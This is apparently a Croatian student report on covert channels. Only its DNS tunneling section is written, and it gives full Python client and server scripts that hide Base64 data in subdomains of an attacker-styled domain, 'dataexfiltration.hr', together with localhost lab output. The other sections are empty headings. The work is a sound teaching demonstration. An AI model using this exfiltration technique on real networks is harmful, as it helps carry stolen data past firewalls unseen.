# 1. Uvod









# 2. DNS Tunneling - Donat Ricov

Domain Name System protokol, poznat i kao DNS protokol, obuhvaća tehniku za prijenos podataka koji protokolu nisu izvorno namjenjeni. Iako je DNS koristan za prevođenje naziva domena u IP adrese te je kao takav osnovni protokol intereta, ovakva priroda samog protokola čine ga idealnim medijem za zaobilaženje standardnih sigurnosnih politika i stvaranje skirvenih komunikacijskih kanala. To znači da osim što DNS zbog svoje široke primjene može biti korišten u legitimate svrhe, također može biti zlouporabljen u kontekstu kibernetičkih napada kako bi se izvršila neželjena eksfiltracija podataka.

Tipičan primjer zlouporabe DNS protokola obuhvaća scenarij u kojem napadač enkapsulira podatke unutar DNS upita i njegovog odgovora. Ovi podaci mogu obihvaćati bezazlen internet promet i standardne komande, ali može se raditi o povjerljivim sigurnosim podacima. Budući da većina mreža dopušta DNS promet zbog njegove prethodno spomenute široke uporabe, potencijalna zlouporaba često može proći nefiltrirana u odnosu na druge vrste prometa. Potencijalno opasan mrežni promet tako često može zaobići vatrozide i probijati sigurnosne sustave u potpunosti neopaženo. Rezultat ovog je stvoren tunel između kompromitiranog sustava i udaljenog poslužitelja napadača.

Mehanizam rada DNS tunnelinga obično uključuje nekoliko komponenti:

1. Klijent na kompromitiranom uređaju - dio malicioznog softvera koji kodira podatke u oblik prikladan za DNS upite.

2. DNS poslužitelj kontroliran od napadača - konfiguriran za obradu neuobičajenih DNS upita i dekodiranje sadržaja unutar njih.

3. Tunneling protokol - definira način pretvaranja podataka u DNS pakete te njihovu rekonstrukciju na odredištu.

Ovakva struktura, zajedno sa standardizacijom samog DNS-a, su razlog njegove učinkovitosti. DNS nazivi domena imaju definiranu strukturu prema kojoj isti mogu sadržavati samo relativno duge nizove znakova. Ovakva struktura omogućava napadaču prenošenje osjetljivih kodiranih podataka. Ovako DNS upiti prolaze kroz nekoliko poslužitelja što otežava, ili čak onemogućuje, lociranje stvarnog izvora tunnelinga.

<img width="6056" height="2050" alt="image" src="https://github.com/user-attachments/assets/29ece733-e97f-48fa-b4b3-a22080c25a47" />

<p align="center"><em>Slika 1: Primjer DNS tunnelinga</em></p>

Iako je tehnika široko poznada u području mrežne i kibernetičke sigurnosti kao medij zlouporabe informacija, krađu podataka i održavanje zlonamjernih kanala, DNS tunneling ima raširene legitimne primjene. Pojedini administratori su korisnici ove tehnike jer im dopušta omogućavanje ograničenih mrežnih usluga u ograničenim ili čak zatvorenim okruženjima. Ipak, i u ovakvim okruženjima primjena ovakvog pristupa može sa sobom nositi legitiman rizik koji može komprimirati sigurnosne politike mreže.

Uzevši u obzir eklatantan porast uporabe DNS tunnelinga u malicioznim svrhama, moderni sigurnosni sustavi često provide napredne analize DNS prometa, dok mrežni administratori pomno prate potencijalne anomalije u strukturi samog prometa. 

# 2.1. Plan izrade praktičnog dijela

Praktični dio rada temelji se na izgradnji i simulaciji okruženja u kojem se demonstrira način funkcioniranja DNS tunnelinga. U ovoj fazi simulirano je generiranje, prijenos i presretanje samih podataka koji su skriveni unutar legitimnog DNS promjeta. Na ovaj je način demonstrirano kako se u praksi može izgraditi ovakav tunel kojim se prenose podaci putem standardnih DNS mehanizama. Također, evidentirano je kako ovakva vrsta prometa izgleda kada je promatrana kroz alate za analizu mreže. Ovakva vrsta pristupa pruža jasnu ilustraciju koncepta DNS tunnelinga kao i praktični prikaz realnog scenarija napada. Ovo je ključno za razumjevanje tehničke izvedbe napada i njegovog potencijalnog sigurnosnog značaja za sami sustav.

## 2.2. Metode i tehnike rada


Za postavljanje izoliranog okruženja simulacije korišten je Oracle VirtualBox. Odabrana je ova ruta jer on omogućuje stvaranje virtualnog stroja u kontroliranom i izoliranom okruženju. Ovo je od visoke važnosti budući da je tu simuliran sam napad. Također, na ovaj mi je način omogućeno simuliranje nekoliko uloga u napadu (klijent, napadač i sam DNS poslužitelj). 

Operacijski sustav koji je korišten je Ubuntu/Linux Mint 22. Ovaj OS je odabran zbog stabilnosti, jednostavnosti konfiguracije mrežnih servisa i dostupnosti potrebnih alata.

Za nadzor i analizu mrežnog prometa koriste se alati:

- Wireshark - za detaljnu grafičku analizu paketa, dekodiranje DNS upita i odgovora te praćenje anomalija u prometu.

- tcpdump - za tekstualno praćenje prometa u stvarnom vremenu, posebno korisno za verifikaciju da se tunelirani sadržaj doista pojavljuje unutar DNS paketa.

U eksperimentalnoj konfiguraciji lokalna fizička računala služe kao tunnel endpoint, odnosno krajnja točka napadačkog kanala. Uz to se simulira rad lokalnog DNS poslužitelja čija je adresa namjerno postavljena na 127.0.0.1, kako bi sav DNS promet bio preusmjeren na Python skriptu koja oponaša ponašanje DNS servera. Time se osigurava potpuno kontrolirano okruženje za testiranje bez rizika utjecaja na stvarnu mrežnu infrastrukturu.

Klijentski program i simulirani DNS poslužitelj implementirani su u programskom jeziku Python, što omogućuje potpunu fleksibilnost u manipuliranju DNS zaglavljima i generiranju vlastitih DNS paketa. Ovaj pristup omogućuje jasno prikazivanje osnovne ideje tuneliranja - enkapsuliranja proizvoljnih podataka u DNS upit i njihovo naknadno izvlačenje na strani poslužitelja.

Simulacija samog napada provedena je u idućim koracima:

1. Postavljanje lokalne domene

2. Simulacija DNS poslužitelja

3. Konfiguracija klijenta

4. Slanje tuneliranog prometa

5. Nadzor prometa alatima tcpdump i Wireshark

6. Obrada i rekonstrukcija podataka na strani poslužitelja

## 2.3. Praktični dio

U sklopu praktičnog dijela rada implementiran je jednostavan DNS poslužitelj u programskom jeziku Python koji služi za demonstraciju DNS tunnelinga. Poslužitelj obrađuje dolazne DNS zahtjeve, iz imena domene izdvaja skrivenu poruku kodiranu u Base64 formatu te je dekodira na strani napadača. Time se ilustrira kako je moguće prenijeti proizvoljne podatke unutar DNS prometa.

### 2.3.1. Poslužitelj - dns_server.py

Na početku skripte uvoze se potrebni moduli:
```
import socket
import base64
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A
```
Modul socket služi za rad s UDP socketima i primanje/slanje DNS paketa, base64 omogućuje dekodiranje poruka koje su skrivene u DNS upitima, dok se pomoću biblioteke dnslib pojednostavljuje parsiranje i generiranje DNS zapisa (upita i odgovora).
```
Ekstrakcija skrivene poruke iz poddomene

Funkcija extract_message_from_subdomain(subdomain) zadužena je za dekodiranje skrivene poruke:

def extract_message_from_subdomain(subdomain):
    try:
        return base64.urlsafe_b64decode(subdomain.encode()).decode()
    except Exception as error:
        return f"Error decoding message: {error}"
```
Pretpostavlja se da je tajna poruka kodirana u Base64 formatu i umetnuta u prvi dio domene (poddomenu). Funkcija prima taj niz znakova, pretvara ga u bajtove i potom pokušava dekodirati iz Base64 natrag u čitljiv tekst. U slučaju pogreške (npr. ako niz nije ispravno kodiran), vraća se poruka o grešci. Ovaj korak direktno predstavlja “vađenje” tuneliranih podataka iz DNS upita.

Obrada DNS upita i dekodiranje tajne

Ključna logika implementirana je u funkciji process_dns_query(query_data, client_ip):
```
def process_dns_query(query_data, client_ip):
    parsed_query = DNSRecord.parse(query_data)
    response_record = DNSRecord(
        DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1),
        q=parsed_query.q
    )
    requested_domain = str(parsed_query.q.qname)
    print(f"Received DNS request for: {requested_domain} from {client_ip}")
```
Primljeni DNS paket se parsira pomoću DNSRecord.parse, čime se dobiva struktura koja olakšava dohvaćanje traženog imena domene (qname). Na temelju dobivenog upita kreira se početni DNS odgovor (response_record), pri čemu se zadržava isti identifikator (id) kako bi klijent prepoznao odgovor kao pripadajući odgovarajućem upitu.

Sljedeći dio funkcije provjerava radi li se o domeni koja se koristi za tuneliranje:
```
    if "dataexfiltration.hr" in requested_domain:
        domain_parts = requested_domain.split('.')
        if len(domain_parts) > 2:
            secret_part = domain_parts[0]
            decoded_message = extract_message_from_subdomain(secret_part)
            print(f"Decoded secret: {decoded_message}")
        
        ip_address = "127.0.0.1"
        response_record.add_answer(RR(requested_domain, QTYPE.A, rdata=A(ip_address), ttl=300))
        print(f"Responding with IP: {ip_address}")
    else:
        print(f"Invalid domain query for: {requested_domain}")

    return response_record.pack()
```
Domena „dataexfiltration.hr“ predstavlja napadačevu domenu namijenjenu eksfiltraciji podataka. Ako se u zahtjevu nalazi ta domena, skripta razbija ime domene na dijelove pomoću točke (split('.')). U slučaju da postoji više od dva dijela (npr. tajnaPoruka.dataexfiltration.hr), pretpostavlja se da je prvi dio (secret_part) Base64-kodirana tajna poruka. Ta se poddomena potom prosljeđuje funkciji extract_message_from_subdomain, a dekodirana poruka ispisuje se u konzolu. Time napadačev poslužitelj “čita” tunelirane podatke skrivenе u DNS imenu.

Neovisno o sadržaju poruke, DNS poslužitelj vraća legitiman odgovor klijentu: dodaje A zapis koji traženu domenu mapira na IP adresu 127.0.0.1. Na taj način DNS odgovor izgleda uobičajeno, a tuneliranje ostaje skriveno unutar same strukture upita.

Ako zahtjev nije usmjeren na domenu dataexfiltration.hr, poslužitelj ga označava kao nevažeći za potrebe tuneliranja, ali ga i dalje može obraditi ili ignorirati, ovisno o daljnjoj implementaciji.

Pokretanje DNS poslužitelja

Funkcija run_dns_server implementira samu DNS uslugu koja neprekidno sluša na odabranom portu:
```
def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
    print(f"DNS server is running on {bind_address}:{bind_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind((bind_address, bind_port))
        while True:
            try:
                query_data, client_address = server_socket.recvfrom(512)
                response_data = process_dns_query(query_data, client_address)
                server_socket.sendto(response_data, client_address)
            except Exception as e:
                print(f"Error during query processing: {e}")
```
Poslužitelj koristi UDP socket jer DNS standardno radi preko UDP-a. Socket se veže na zadanu IP adresu i port (u ovom slučaju 5354), zatim u beskonačnoj petlji (while True) prima DNS upite do veličine 512 bajtova (standardna veličina DNS paketa). Svaki primljeni upit prosljeđuje se funkciji process_dns_query, a dobiveni odgovor ponovno se šalje klijentu na istu adresu. Ugrađena je osnovna obrada grešaka kako bi se spriječio prestanak rada poslužitelja zbog iznimki.

Na kraju se skripta pokreće standardnim Python obrascem:
```
if __name__ == "__main__":
    try:
        run_dns_server()
    except KeyboardInterrupt:
        print("\nDNS server stopped.")
```
Ovo omogućuje da se DNS poslužitelj pokrene samo kada se skripta izvršava izravno, dok se logika može ponovno koristiti i kao modul u drugim programima.

## 2.3.2. Klijent - client.py

Klijentska skripta implementirana u Pythonu zadužena je za generiranje DNS upita koji sadrže skrivenu (tuneliranu) poruku te njihovo slanje prema simuliranom DNS poslužitelju. Skripta koristi biblioteku dnspython, koja omogućuje jednostavno kreiranje i slanje DNS upita, dok se za skrivanje podataka koristi Base64 kodiranje. Ovakav pristup vjerno simulira tipičnu tehniku eksfiltracije podataka putem DNS protokola.

Na početku skripte nalaze se uvozi potrebnih modula:
```
import dns.message
import dns.query
import base64
```
Modul dns.message omogućuje stvaranje DNS upita, dns.query upravlja slanjem upita putem UDP protokola, a base64 se koristi za kodiranje tajnih podataka u oblik pogodan za umetanje u ime domene.

Kodiranje podataka u poddomenu

Funkcija encode_data_in_subdomain(data, domain) pretvara proizvoljnu poruku u Base64 format i umetne je kao poddomenu ispred napadačeve domene:
```
def encode_data_in_subdomain(data, domain):
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    return f"{encoded}.{domain}"
```

Postupak je sljedeći:

Poruka (data) se pretvara u bajtove i kodira Base64 algoritmom.

Dobiveni Base64 niz se spaja s domenom napadača, pri čemu se formira DNS ime oblika:

kodiranaPoruka.dataexfiltration.hr


Ovaj pristup omogućuje skrivanje tajnih podataka unutar DNS upita jer svaki segment domene smije sadržavati alfanumeričke znakove i određene simbole — što Base64 ispunjava.

Slanje tunelirane poruke DNS upitom

Glavna funkcija transmit_dns_tunnel_message zadužena je za sastavljanje DNS upita, enkapsulaciju poruke te slanje upita prema ciljnom DNS poslužitelju:
```
def transmit_dns_tunnel_message(server, domain, message, port=53):
    query_domain = encode_data_in_subdomain(message, domain)
    query = dns.message.make_query(query_domain, dns.rdatatype.A)
    try:
        response = dns.query.udp(query, server, port=port)
        print(f"Message sent: '{message}' as '{query_domain}'")
        print(f"Response:\n{response}")
    except Exception as e:
        print(f"Transmission failed: {e}")
```

Ova funkcija radi nekoliko ključnih koraka:

Skrivanje poruke – poziva se encode_data_in_subdomain, koja poruku pretvara u Base64 i smješta je u ime domene.

Stvaranje DNS upita – pomoću dns.message.make_query kreira se standardni DNS A upit za domenu koja u sebi nosi skrivenu poruku.

Slanje upita UDP-om – dns.query.udp šalje DNS upit na adresu simuliranog poslužitelja.

Ispis rezultata – skripta prikazuje izvorni tekst poruke, njezinu kodiranu verziju te DNS odgovor primljen sa servera.

U slučaju problema (npr. nedostupan server), funkcija hvata iznimku i ispisuje poruku o grešci.

Ovaj mehanizam vjerno predstavlja klijentsku stranu DNS tunnelinga — napadač šalje kriptirane podatke unutar DNS upita, a poslužitelj ih dekodira.

Glavni dio skripte

U glavnom dijelu definiraju se parametri tuneliranja i pokreće se funkcija za slanje poruke:
```
if __name__ == "__main__":
    domain = "dataexfiltration.hr"
    server_ip = "127.0.0.1"
    server_port = 5354

    msg = "Ova poruka je tajna."

    transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)
```

domain predstavlja kontroliranu domenu napadača.

server_ip i server_port upućuju na lokalni simulirani DNS poslužitelj implementiran ranije.

msg sadrži podatke koje napadač želi eksfiltrirati.

Poziv transmit_dns_tunnel_message inicira stvarni DNS tunneling.

Ovaj dio skripte služi kao demonstracija kako se jednostavan tekst može “zapakirati“ u DNS upit i poslati, što u praksi predstavlja osnovni mehanizam DNS eksfiltracije podataka.

## 2.4. Slanje poruke i snimanje prometa

### 2.4.1. tcmdump

Snimio sam pakete koji idu na portu 5354.
```
sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap
```
<img width="674" height="53" alt="image" src="https://github.com/user-attachments/assets/68adec33-df9d-417a-9c34-c6cd96bd68a8" />


### 2.4.2. Pokretanje DNS servera

Otvorio sam drugi terminal i u njemu pokrenuo

cd dns_tunnel
python3 dns_server.py

I dobio poruku:

Starting DNS server on 0.0.0.0:5354

<img width="830" height="84" alt="image" src="https://github.com/user-attachments/assets/63987700-56cc-457f-83bd-92c276547971" />

### 2.4.3. Pokretanje klijenta i slanje poruke

Otvorio sam treći terminal i pokrenuo:

cd dns_tunnel
python3 client.py

Što je ispisalo:

donat@donat-VirtualBox:~$ cd dns_tunnel
python3 client.py
Message sent: 'Ova poruka je tajna.' as 'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr'
Response:
id 64216
opcode QUERY
rcode NOERROR
flags QR AA RD RA
;QUESTION
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. IN A
;ANSWER
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
;AUTHORITY
;ADDITIONAL

<img width="729" height="238" alt="image" src="https://github.com/user-attachments/assets/1e803ab6-0953-43a0-8d24-d0fcdf73e0a1" />

### 2.4.3. Čitanje tajne poruke

donat@donat-VirtualBox:~/dns_tunnel$ python3 dns_server.py
DNS server is running on 0.0.0.0:5354
Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from ('127.0.0.1', 41631)
Decoded secret: Ova poruka je tajna.
Responding with IP: 127.0.0.1

<img width="819" height="90" alt="image" src="https://github.com/user-attachments/assets/a6b2dc61-b38e-4c94-aeb6-af558db5e994" />

### 2.4.4. Zaustavljanje tcpdump-a

Kada sam zaustavio tcpdump dobio sam 

^C2 packets captured
4 packets received by filter
0 packets dropped by kernel
donat@donat-VirtualBox:~$ ^C

<img width="232" height="67" alt="image" src="https://github.com/user-attachments/assets/ffc478b0-9204-4ccb-a292-85e283a33e76" />

Te sam dobio datoteku dns_tunnel.pcap.

### 2.5. Analiza prometa u Wiresharku









































# 3. Steganografija - Lana Maček

# 4. Covert timing channels - Marin Vabec

# 5. SMTP - Dino Primorac
